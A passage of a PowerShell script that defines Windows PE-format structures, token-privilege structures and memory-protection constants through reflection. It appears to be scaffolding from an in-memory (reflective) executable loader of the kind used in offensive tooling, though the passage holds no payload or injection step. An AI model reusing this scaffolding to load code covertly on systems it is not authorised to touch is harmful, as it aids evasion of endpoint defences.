        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        ############ ENUM ############
        #Enum MachineType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        #Enum MagicType
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
        $MagicType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

        #Enum SubSystemType
        $TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        #Enum DllCharacteristicsType
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        ########### STRUCT ###########
        #Struct IMAGE_DATA_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        #Struct IMAGE_FILE_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        #Struct IMAGE_OPTIONAL_HEADER64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        #Struct IMAGE_OPTIONAL_HEADER32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        #Struct IMAGE_NT_HEADERS64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
        
        #Struct IMAGE_NT_HEADERS32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        #Struct IMAGE_DOS_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()    
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        #Struct IMAGE_SECTION_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        #Struct IMAGE_BASE_RELOCATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        #Struct IMAGE_IMPORT_DESCRIPTOR
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        #Struct IMAGE_EXPORT_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
        
        #Struct LUID
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
        
        #Struct LUID_AND_ATTRIBUTES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
        
        #Struct TOKEN_PRIVILEGES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object
        
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
